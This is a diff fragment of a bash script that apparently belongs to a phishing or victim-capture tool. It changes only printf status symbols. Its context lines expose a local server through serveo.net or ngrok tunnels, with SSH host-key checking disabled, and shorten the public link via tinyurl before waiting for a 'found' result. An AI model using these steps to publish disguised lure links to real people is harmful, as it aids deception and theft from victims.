@@ -324,9 +324,9 @@ fi
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
 sleep 10
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s \n' $send_link
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s \n' $send_link
 send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
-printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Direct link (tinyurl):\e[0m\e[1;77m %s \n' $send_ip
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link (tinyurl):\e[0m\e[1;77m %s \n' $send_ip
 checkfound
 
 
@@ -406,7 +406,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting Ngrok...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m+\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 checkfound
 }
 
